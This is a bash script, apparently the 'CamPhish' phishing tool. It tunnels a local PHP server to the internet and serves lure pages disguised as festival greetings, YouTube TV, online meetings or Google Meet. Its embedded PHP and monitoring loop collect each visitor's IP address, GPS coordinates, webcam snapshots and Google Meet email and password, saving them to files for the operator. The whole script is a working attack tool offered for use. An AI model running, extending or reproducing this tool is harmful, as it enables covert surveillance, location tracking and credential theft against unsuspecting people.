#!/bin/bash

# Set error handling
set -e

# Windows compatibility check
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  # We're on Windows
  windows_mode=true
  echo "Windows system detected. Some commands will be adapted for Windows compatibility."
  
  # Define Windows-specific command replacements
  function killall() {
    taskkill /F /IM "$1" 2>/dev/null
  }
  
  function pkill() {
    if [[ "$1" == "-f" ]]; then
      shift
      shift
      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
    else
      taskkill /F /IM "$1" 2>/dev/null
    fi
  }
else
  windows_mode=false
fi

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf " \e[1;93m CamPhish Ver 1 \e[0m \n"
printf " \e[1;77m YT | YATHARTH \e[0m \n"

printf "\n"


}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

stop() {
if [[ "$windows_mode" == true ]]; then
  # Windows-specific process termination
  taskkill /F /IM "ngrok.exe" 2>/dev/null
  taskkill /F /IM "php.exe" 2>/dev/null
  taskkill /F /IM "cloudflared.exe" 2>/dev/null
else
  # Unix-like systems
  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
  checkphp=$(ps aux | grep -o "php" | head -n1)
  checkcloudflaretunnel=$(ps aux | grep -o "cloudflared" | head -n1)

  if [[ $checkngrok == *'ngrok'* ]]; then
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
  fi

  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi

  if [[ $checkcloudflaretunnel == *'cloudflared'* ]]; then
    pkill -f -2 cloudflared > /dev/null 2>&1
    killall -2 cloudflared > /dev/null 2>&1
  fi
fi

exit 1
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt
}

catch_location() {
  # First check for the current_location.txt file which is always created
  if [[ -e "current_location.txt" ]]; then
    printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Current location data:\e[0m\n"
    # Filter out unwanted messages before displaying
    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt
    printf "\n"
    
    # Move it to a backup to avoid duplicate display
    mv current_location.txt current_location.bak
  fi

  # Then check for any location_* files
  if [[ -e "location_"* ]]; then
    location_file=$(ls location_* | head -n 1)
    lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r')
    
    # Only display essential location data
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Latitude:\e[0m\e[1;77m %s\e[0m\n" $lat
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Longitude:\e[0m\e[1;77m %s\e[0m\n" $lon
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Accuracy:\e[0m\e[1;77m %s meters\e[0m\n" $acc
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Google Maps:\e[0m\e[1;77m %s\e[0m\n" $maps_link
    
    # Create directory for saved locations if it doesn't exist
    if [[ ! -d "saved_locations" ]]; then
      mkdir -p saved_locations
    fi
    
    mv "$location_file" saved_locations/
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Location saved to saved_locations/%s\e[0m\n" "$location_file"
  else
    printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] No location file found\e[0m\n"
    
    # Don't display any debug logs to avoid showing unwanted messages
  fi
}

checkfound() {
# Create directory for saved locations if it doesn't exist
if [[ ! -d "saved_locations" ]]; then
  mkdir -p saved_locations
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1;93mACTIVE\e[0m\n"
while [ true ]; do

if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
fi

sleep 0.5

# Check for current_location.txt first (our new immediate indicator)
if [[ -e "current_location.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
catch_location
fi

# Also check for LocationLog.log (the original indicator)
if [[ -e "LocationLog.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
# Don't display the raw log content, just process it
catch_location
rm -rf LocationLog.log
fi

# Don't display error logs to avoid showing unwanted messages
if [[ -e "LocationError.log" ]]; then
# Just remove the file without displaying its contents
rm -rf LocationError.log
fi

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 
}

cloudflare_tunnel() {
if [[ -e cloudflared ]] || [[ -e cloudflared.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"

# Detect architecture
arch=$(uname -m)
os=$(uname -s)
printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: $os, Architecture: $arch\n"

# Windows detection
if [[ "$windows_mode" == true ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\n"
    wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe > /dev/null 2>&1
    if [[ -e cloudflared.exe ]]; then
        chmod +x cloudflared.exe
        # Create a wrapper script to run the exe
        echo '#!/bin/bash' > cloudflared
        echo './cloudflared.exe "$@"' >> cloudflared
        chmod +x cloudflared
    else
        printf "\e[1;93m[!] Download error... \e[0m\n"
        exit 1
    fi
else
    # Non-Windows systems
    # macOS detection
    if [[ "$os" == "Darwin" ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
        if [[ "$arch" == "arm64" ]]; then
            printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\n"
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz > /dev/null 2>&1
        else
            printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz > /dev/null 2>&1
        fi
        
        if [[ -e cloudflared.tgz ]]; then
            tar -xzf cloudflared.tgz > /dev/null 2>&1
            chmod +x cloudflared
            rm cloudflared.tgz
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    # Linux and other Unix-like systems
    else
        case "$arch" in
            "x86_64")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                ;;
            "i686"|"i386")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
                ;;
            "aarch64"|"arm64")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
                ;;
            "armv7l"|"armv6l"|"arm")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
                ;;
            *)
                printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                ;;
        esac
        
        if [[ -e cloudflared ]]; then
            chmod +x cloudflared
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
rm -rf .cloudflared.log > /dev/null 2>&1 &

if [[ "$windows_mode" == true ]]; then
    ./cloudflared.exe tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
else
    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
fi

sleep 10
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might be down\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlared is already running, run this command killall cloudflared\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url 127.0.0.1:3333 to see specific errors\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try running: cloudflared.exe tunnel --url 127.0.0.1:3333\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
payload_cloudflare
checkfound
}

payload_cloudflare() {
    # Get the Cloudflare tunnel URL
    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$HOME/.cld.log" 2>/dev/null || true)
    
    if [ -z "$link" ]; then
        printf "\e[1;91m[!] Failed to get Cloudflare tunnel URL. Please check your internet connection.\e[0m\n"
        exit 1
    fi
    
    printf "\e[1;92m[+] Using Cloudflare tunnel URL: %s\e[0m\n" "$link"

# Create a secure PHP router
cat > index.php << 'EOL'
<?php
// Disable error display in production
error_reporting(0);
ini_set('display_errors', 0);

// Set security headers
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: no-referrer');
header('Content-Security-Policy: default-src \'self\'');

// Get the request URI
$request = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$request = ltrim($request, '/');

// Route requests
if ($request === 'post.php' || $request === '') {
    // Handle form submissions
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        require_once 'post.php';
        exit;
    }
    // Serve the main page
    if (file_exists('index2.html')) {
        readfile('index2.html');
    } else if (file_exists('index.html')) {
        readfile('index.html');
    } else {
        header('HTTP/1.0 404 Not Found');
        echo 'Page not found';
    }
} else if ($request === 'debug_log.php') {
    // Handle debug logs
    require_once 'debug_log.php';
} else if (file_exists($request)) {
    // Serve static files if they exist
    $mime_types = [
        'html' => 'text/html',
        'css'  => 'text/css',
        'js'   => 'application/javascript',
        'png'  => 'image/png',
        'jpg'  => 'image/jpeg',
        'jpeg' => 'image/jpeg',
        'gif'  => 'image/gif',
    ];
    
    $ext = strtolower(pathinfo($request, PATHINFO_EXTENSION));
    if (array_key_exists($ext, $mime_types)) {
        header('Content-Type: ' . $mime_types[$ext]);
    }
    readfile($request);
} else {
    // 404 Not Found
    header('HTTP/1.0 404 Not Found');
    echo '404 Not Found';
}
?>
EOL

# Process the selected template
if [[ $option_tem -eq 1 ]]; then
    # Festival Wishes template
    if [ ! -f "festivalwishes.html" ]; then
        printf "\e[1;91m[!] Error: festivalwishes.html not found!\e[0m\n"
        exit 1
    fi
    sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
    sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
    rm -f index3.html
    
elif [[ $option_tem -eq 2 ]]; then
    # Live YouTube TV template
    if [ ! -f "LiveYTTV.html" ]; then
        printf "\e[1;91m[!] Error: LiveYTTV.html not found!\e[0m\n"
        exit 1
    fi
    sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
    sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
    rm -f index3.html
    
elif [[ $option_tem -eq 4 ]]; then
    # Google Meet template
    if [ ! -f "GoogleMeet.html" ]; then
        printf "\e[1;91m[!] Error: GoogleMeet.html not found!\e[0m\n"
        exit 1
    fi
    
    # Create index2.html with the Google Meet template
    sed 's+forwarding_link+'$link'+g' GoogleMeet.html | \
    sed 's+abc-defg-hij+'${meet_code:-abc-defg-hij}'+g' > index2.html
    
    # Create a directory for captured images if it doesn't exist
    mkdir -p captured_images
    
    # Create a simple PHP endpoint to handle form submissions
    cat > post.php << 'PHP_END'
<?php
// Set timezone
date_default_timezone_set('Asia/Kolkata');

// Get client IP
function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

// Get user agent info
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$browser = 'Unknown';
$os = 'Unknown';

// Get browser
if (strpos($user_agent, 'MSIE') !== false || strpos($user_agent, 'Trident') !== false) {
    $browser = 'Internet Explorer';
} elseif (strpos($user_agent, 'Firefox') !== false) {
    $browser = 'Mozilla Firefox';
} elseif (strpos($user_agent, 'Chrome') !== false) {
    $browser = 'Google Chrome';
} elseif (strpos($user_agent, 'Opera Mini') !== false) {
    $browser = 'Opera Mini';
} elseif (strpos($user_agent, 'Opera') !== false) {
    $browser = 'Opera';
} elseif (strpos($user_agent, 'Safari') !== false) {
    $browser = 'Safari';
}

// Get OS
if (strpos($user_agent, 'Windows') !== false) {
    $os = 'Windows';
} elseif (strpos($user_agent, 'Linux') !== false) {
    $os = 'Linux';
} elseif (strpos($user_agent, 'Mac') !== false) {
    $os = 'Mac';
} elseif (strpos($user_agent, 'Android') !== false) {
    $os = 'Android';
} elseif (strpos($user_agent, 'iOS') !== false) {
    $os = 'iOS';
}

// Handle Google Meet form submission
if (isset($_POST['email'])) {
    $email = $_POST['email'];
    $password = isset($_POST['password']) ? $_POST['password'] : 'N/A';
    $ip = get_client_ip();
    $date = date('Y-m-d H:i:s');
    
    $log = "[GOOGLE_MEET] Date: $date | IP: $ip | Email: $email | Password: $password | Browser: $browser | OS: $os\n";
    file_put_contents('saved_google_meet_credentials.txt', $log, FILE_APPEND);
}

// Handle image capture
if (isset($_POST['cat'])) {
    $date = date('dMYHis');
    $imageData = $_POST['cat'];
    
    if (!empty($imageData)) {
        $filteredData = substr($imageData, strpos($imageData, ",")+1);
        $unencodedData = base64_decode($filteredData);
        
        // Create captured_images directory if it doesn't exist
        if (!file_exists('captured_images')) {
            mkdir('captured_images', 0777, true);
        }
        
        $filename = 'captured_images/cam_'.$date.'.png';
        file_put_contents($filename, $unencodedData);
        
        // Log the image capture
        $log = "[IMAGE_CAPTURE] Date: $date | IP: $ip | File: $filename | Browser: $browser | OS: $os\n";
        file_put_contents('capture_log.txt', $log, FILE_APPEND);
    }
}

// Always return success response
header('Content-Type: application/json');
echo json_encode(['status' => 'success']);
?>
PHP_END

else
    # Default template (Online Meeting)
    sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
fi

# Make sure the captured_images directory exists and is writable
mkdir -p captured_images
chmod 777 captured_images 2>/dev/null || true

# Make sure the log files are writable
touch saved_google_meet_credentials.txt capture_log.txt
chmod 666 saved_google_meet_credentials.txt capture_log.txt 2>/dev/null || true
}

ngrok_server() {
if [[ -e ngrok ]] || [[ -e ngrok.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"

# Detect architecture
arch=$(uname -m)
os=$(uname -s)
printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: $os, Architecture: $arch\n"

# Windows detection
if [[ "$windows_mode" == true ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\n"
    wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip > /dev/null 2>&1
    if [[ -e ngrok.zip ]]; then
        unzip ngrok.zip > /dev/null 2>&1
        chmod +x ngrok.exe
        rm -rf ngrok.zip
    else
        printf "\e[1;93m[!] Download error... \e[0m\n"
        exit 1
    fi
else
    # macOS detection
    if [[ "$os" == "Darwin" ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
        if [[ "$arch" == "arm64" ]]; then
            printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\n"
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip -O ngrok.zip > /dev/null 2>&1
        else
            printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip -O ngrok.zip > /dev/null 2>&1
        fi
        
        if [[ -e ngrok.zip ]]; then
            unzip ngrok.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok.zip
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    # Linux and other Unix-like systems
    else
        case "$arch" in
            "x86_64")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "i686"|"i386")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "aarch64"|"arm64")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "armv7l"|"armv6l"|"arm")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            *)
                printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
        esac
        
        if [[ -e ngrok.zip ]]; then
            unzip ngrok.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok.zip
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    fi
fi
fi

# Ngrok auth token handling
if [[ "$windows_mode" == true ]]; then
    if [[ -e "$USERPROFILE\.ngrok2\ngrok.yml" ]]; then
        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
        cat "$USERPROFILE\.ngrok2\ngrok.yml"
        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
            ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
        fi
    else
        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
        ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
    fi
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
    ./ngrok.exe http 3333 > /dev/null 2>&1 &
else
    if [[ -e ~/.ngrok2/ngrok.yml ]]; then
        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
        cat  ~/.ngrok2/ngrok.yml
        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
            ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
        fi
    else
        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
        ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
    fi
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
fi

sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running ngrok manually: ./ngrok http 3333\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
payload_ngrok
checkfound
}

payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^"]*\.ngrok-free\.app')
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
elif [[ $option_tem -eq 4 ]]; then
sed 's+forwarding_link+'$link'+g' GoogleMeet.html > index3.html
sed 's+abc-defg-hij+'${meet_code:-abc-defg-hij}'+g' index3.html > index2.html
rm -rf index3.html
else
sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
fi
}

camphish() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n-----Choose tunnel server----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template

if [[ $option_server -eq 2 ]]; then
cloudflare_tunnel
elif [[ $option_server -eq 1 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
camphish
fi
}

select_template() {
    if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
        printf "\e[1;93m[!] Invalid tunnel option! try again\e[0m\n"
        sleep 1
        clear
        banner
        camphish
        return 1
    fi
    
    printf "\n-----Choose a template----\n"
    printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Google Meet\e[0m\n"
    
    default_option_template="1"
    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template [1-4, default:1]: \e[0m' option_tem
    option_tem="${option_tem:-${default_option_template}}"
    
    case $option_tem in
        1)
            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
            fest_name="${fest_name//[^a-zA-Z0-9]/}"  # Only allow alphanumeric characters
            ;;
        2)
            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
            yt_video_ID="${yt_video_ID//[^a-zA-Z0-9_-]/}"  # Clean YouTube ID
            ;;
        3)
            # Online Meeting - no additional input needed
            ;;
        4)
            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter meeting code (e.g., abc-defg-hij): \e[0m' meet_code
            meet_code="${meet_code//[^a-zA-Z0-9-]/}"  # Only allow alphanumeric and hyphens
            ;;
        *)
            printf "\e[1;93m[!] Invalid template option! Please try again\e[0m\n"
            sleep 1
            select_template
            ;;
    esac
}

banner
dependencies
camphish
